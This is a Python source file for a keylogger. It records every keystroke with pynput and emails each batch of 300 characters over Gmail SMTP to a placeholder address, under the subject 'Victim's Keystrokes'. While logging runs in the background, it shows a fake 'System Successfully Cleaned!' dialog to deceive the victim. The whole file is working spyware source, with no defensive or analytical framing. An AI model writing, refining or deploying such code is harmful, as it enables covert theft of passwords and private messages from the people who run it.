from pynput.keyboard import Listener, Key
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import tkinter as tk
from tkinter import messagebox
import threading

# Global variables for email functionality
email_keystrokes = ""

def show_system_message():
    """Show a Windows-style system message"""
    try:
        # Create a hidden root window
        root = tk.Tk()
        root.withdraw()  # Hide the main window
        
        # Show the message box
        messagebox.showinfo("System", "System Successfully Cleaned! You may close this window.")
        
        # Destroy the root window
        root.destroy()
    except:
        pass  # Silently fail if tkinter is not available

def log_keystroke(key):
    global email_keystrokes
    
    # Handle regular character keys
    if hasattr(key, 'char') and key.char is not None:
        key_char = key.char
    else:
        # Log special keys with readable names
        key_map = {
            Key.enter: "[ENTER]",
            Key.shift: "[SHIFT]",
            Key.shift_r: "[SHIFT]",
            Key.ctrl: "[CTRL]",
            Key.ctrl_r: "[CTRL]",
            Key.alt: "[ALT]",
            Key.alt_r: "[ALT]",
            Key.backspace: "[BACKSPACE]",
            Key.tab: "[TAB]",
            Key.esc: "[ESC]",
            Key.caps_lock: "[CAPSLOCK]",
            Key.delete: "[DEL]",
            Key.up: "[UP]",
            Key.down: "[DOWN]",
            Key.left: "[LEFT]",
            Key.right: "[RIGHT]",
            Key.home: "[HOME]",
            Key.end: "[END]",
            Key.page_up: "[PGUP]",
            Key.page_down: "[PGDN]",
            Key.insert: "[INS]",
            Key.menu: "[MENU]",
            Key.num_lock: "[NUMLOCK]",
            Key.print_screen: "[PRTSC]",
            Key.scroll_lock: "[SCROLL]",
            Key.pause: "[PAUSE]"
        }
        key_char = key_map.get(key, f"[{str(key).replace('Key.', '').upper()}]")
    
    # Add to email keystrokes
    email_keystrokes += key_char
    
    # Check if email keystrokes reach threshold (300 characters)
    if len(email_keystrokes) >= 300:
        send_email_with_content(email_keystrokes)
        email_keystrokes = ""  # Reset email keystrokes after sending

def send_email_with_content(content):
    """Send keystrokes via email when threshold is reached"""
    from_email = "example@gmail.com"
    to_email = "example@gmail.com"
    password = "app password"

    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = "Victim's Keystrokes"
    msg.attach(MIMEText(content, 'plain'))

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(from_email, password)
        server.sendmail(from_email, to_email, msg.as_string())
        server.quit()
    except Exception as e:
        pass

def start_logging():
    with Listener(on_press=log_keystroke) as listener:
        listener.join()

if __name__ == "__main__":
    # Show the system message in a separate thread so it doesn't block the keylogger
    message_thread = threading.Thread(target=show_system_message)
    message_thread.daemon = True
    message_thread.start()
    
    start_logging() 